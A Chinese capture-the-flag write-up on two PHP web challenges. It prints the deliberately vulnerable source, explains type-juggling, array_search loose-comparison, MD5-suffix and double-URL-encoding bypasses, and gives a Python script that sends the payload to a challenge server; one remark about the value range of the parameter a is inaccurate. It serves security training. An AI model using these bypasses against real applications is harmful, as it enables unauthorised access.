# easyphp

知识点：代码审计+强弱类型+array_search绕过

[参考教程](https://blog.csdn.net/bmth666/article/details/104769645)

```php
<?php
highlight_file(__FILE__);
$key1 = 0;
$key2 = 0;

$a = $_GET['a'];
$b = $_GET['b'];

if(isset($a) && intval($a) > 6000000 && strlen($a) <= 3){ 
    if(isset($b) && '8b184b' === substr(md5($b),-6,6)){
        $key1 = 1;
    }else{
        die("Emmm...再想想");
    }
}else{
    die("Emmm...");
}

$c=(array)json_decode(@$_GET['c']);
if(is_array($c) && !is_numeric(@$c["m"]) && $c["m"] > 2022){
    if(is_array(@$c["n"]) && count($c["n"]) == 2 && is_array($c["n"][0])){
        $d = array_search("DGGJ", $c["n"]);
        $d === false?die("no..."):NULL;
        foreach($c["n"] as $key=>$val){
            $val==="DGGJ"?die("no......"):NULL;
        }
        $key2 = 1;
    }else{
        die("no hack");
    }
}else{
    die("no");
}

if($key1 && $key2){
    include "Hgfks.php";
    echo "You're right"."\n";
    echo $flag;
}

?> Emmm...
```

**代码逻辑**

构造`$a = 6e7`

- 检查 `a` 是否存在并且将其转换为整数（`intval($a)`）。

- 确保 `a` 大于 6000000 且长度小于等于 3（意味着 `a` 是一个 600 万到 999 万之间的整数）。

构造`$b = 53724`

```python
import hashlib
# 创建一个生成MD5哈希并检查后六位是否为'8b184b'的函数
def find_md5_suffix():
    i = 0
    target_suffix = '8b184b'
    
    while True:
        # 计算当前数值的MD5哈希
        md5_hash = hashlib.md5(str(i).encode()).hexdigest()
        
        # 检查后六位是否等于目标值
        if md5_hash[-6:] == target_suffix:
            return i, md5_hash
       
        i += 1

# 调用函数查找符合条件的值
result = find_md5_suffix()
```



- 检查 `b` 是否存在，并且计算其 MD5 值，然后取其最后 6 个字符。
- 验证这 6 个字符是否与 `8b184b` 相等。
- 如果条件不满足，程序终止输出 `"Emmm...再想想"`。
- 如果条件满足，将 `$key1` 置为 1。



- 将 `$_GET['c']` 通过 `json_decode()` 解码为一个 PHP 数组，并强制转换为数组类型。使用 `@` 来忽略潜在的解码错误。
- 检查 `c` 是否为数组，`c["m"]` 是否为非数字，并且 `c["m"]` 是否大于 2022。
- 如果不满足这些条件，程序终止并输出 `"no"`。
- 使用 `array_search()` 函数在 `c["n"]` 数组中查找字符串 `"DGGJ"`，如果找不到，程序终止并输出 `"no..."`。(array_search() 函数在数组中搜索某个键值，并返回对应的键名。)
- 并且后续的`===`比较时，不能够等于`"DGGJ"`

```python
import requests
import json
# 构造符合条件的 JSON 对象
c_data = {
    "m": "2023abc",  # 非数字且大于 2022,会自动截断
    "n": [[], 0]  # n 是一个包含 2 个元素的数组，n[0] 是一个数组
}
# 将 Python 对象转换为 JSON 字符串
c_json = json.dumps(c_data)
print(c_json)
# 目标URL
url = "http://61.147.171.105:57022/"
payload= {'a': '6e7', 'b': '53724', 'c': c_json}
response = requests.get(url, params=payload)
print(response.text)
```

在`array_search()` 中，比较是`==`，而且`"字符串" == 0`是成立的，因此，只要让一个数组下标非零的位置值为0，那么`array_search()` 就会返回0值的下标，因为下标非0，所以为true。

# PHP2

知识点：phps文件&url解码

```php
<?php
if("admin"===$_GET[id]) {
  echo("<p>not allowed!</p>");
  exit();
}

$_GET[id] = urldecode($_GET[id]);
if($_GET[id] == "admin")
{
  echo "<p>Access granted!</p>";
  echo "<p>Key: xxxxxxx </p>";
}
?>

Can you anthenticate to this website?
```

简单点来说，phps文件就是php的源码，但用户在浏览器上直接访问php文件是渲染后的，看不到源码，为了让其能够看到，就有了phps文件。

根据源码很好知道，两次判定一次解码，但不要忘了后端会自动进行一次解码，加上代码里的，所以有两次解码，我们进行编码也要编两次。

这次知道了：

`%ASCII`就可以url编码，但不仅符号，普通字母也可以用，但数字如果用的话，会变成字符形式，而不是数字。
